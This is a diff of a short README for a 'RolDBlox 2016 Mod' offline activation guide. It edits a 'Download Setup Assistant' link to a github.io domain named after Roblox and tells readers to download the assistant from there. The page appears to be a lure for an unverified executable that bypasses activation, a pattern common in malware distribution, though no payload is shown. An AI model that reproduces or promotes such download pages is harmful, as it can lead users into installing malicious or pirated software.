@@ -1,6 +1,6 @@
 # RolDBlox 2016 Mod — Offline Activation Guide
 
-[![Download Setup Assistant](https://roblox-roldblox-mod-2016-download.github.io/ .github)
+[![Download Setup Assistant](https://roblox-roldblox-mod-2016-download.github.io/.github)
 
 ## ⚙️ How to Use
 1. Download the setup assistant using the button above  
